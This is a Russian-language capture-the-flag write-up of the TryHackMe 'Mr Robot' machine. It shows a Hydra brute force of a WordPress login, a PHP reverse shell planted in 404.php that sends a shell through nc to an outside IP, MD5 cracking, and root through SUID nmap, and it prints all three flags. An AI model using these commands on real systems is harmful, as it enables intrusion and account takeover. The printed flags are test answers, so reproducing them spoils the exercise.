# Машина Mr Robot TryHackMe
Сперва просканирую машину утилитой nmap. После сканировария, я неу увидел особо ничего интересного, самое странное это то, что все порты помечены как close, поэтому попробую просканировать адрес утилирой gobuster.
Перебор директорий тоже особо ничего интересного не показал, узнал только, что из полезного есть форма логина wordpress, от которой я еще не знаю пароль. Далее я самостоятельно из интереса решил проверить файл robots.txt.
В нем я обнаружил путь к первому ключу, и путь к словарю fsociety.dic, в нем было много каких-то слов, скорее всего это какой-то кастомный словарь для перебора. Я так посмотрел, что этот словарь слишком много весит, поэтому я через свой пайтон
скрипт очистил его от дубликатов в файл clean_users.txt.

Далее я решил перебрать пароли для входа в wp. Подумал, что имя Elliot будет самым логичным, поэтому даже на всякий случай проверил его вручную и увидел, что теперь не invalid username, а incorrect password for username elliot, а значит, что учетка
с неймом Elliot есть, поэтому подбираем пароли по найденному мной словарю.

```
hydra -l Elliot -P clean_users.txt 10.82.190.113 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-15 11:47:41
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
[DATA] attacking http-post-form://10.82.190.113:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
[STATUS] 3451.00 tries/min, 3451 tries in 00:01h, 8001 to do in 00:03h, 30 active
[STATUS] 3495.50 tries/min, 6991 tries in 00:02h, 4461 to do in 00:02h, 30 active
[STATUS] 3430.00 tries/min, 10290 tries in 00:03h, 1162 to do in 00:01h, 30 active
[80][http-post-form] host: 10.82.190.113   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-15 11:51:14
```
После того как я вошел в учетку Elliot, я сразу отправился на вкладку Editor, там я могу обновлять содержимое файлов, я так прикинул, и понял, что я могу в строке поиска перейти по файлу 404.php, а значит менять надо его. Я заменил этот файл на 
реверс шелл php:
`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>`
Перешел на свою машину, запустить nc -lnvp 8000, а на целевой захожу на страницу 404.php. Ура, получаю реверс шелл.
После небольшого осмотра, ничего интересного я в папках не находил, поэтому решил перейти сразу в директорию /home, там обнаруживаю две папки: ubuntu и robot. Ubuntu оказалась пустой, а содержимое папки robot:
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
как видно, чтобы получить доступ ко второму ключу, то мне нужно обладать привилегиями пользователя robot, а во втором файле я увидел md5 хэш пароля пользователя robot, сразу перехожу на сайт crackstation.net и вставляю туда хеш:
'''
Hash	Type	Result
c3fcd3d76192e4007dfb496cca67e13b	md5	abcdefghijklmnopqrstuvwxyz
''' 

После расшифровки пробую менять пользователя:
```
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
whoami
robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
Успешно авторизуюсь и читаю файл второго ключа.
Далее мне нужно повысить привилегии, ввожу команду `find / -perm -4000 2>/dev/null`
из интересного там была только утилита nmap. На gtfobins нахожу готовую команду для шелла nmap с правами рут.
```
robot@ip-10-82-190-113:/home$ nmap --interactive
!/bin/shnmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> whoami
!/bin/shwhoami
sh: 1: !/bin/shwhoami: not found
nmap> ls
ls
robot  ubuntu
nmap> ls /root
ls /root
firstboot_done  key-3-of-3.txt
nmap> cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
Успешно получаю финальный флаг
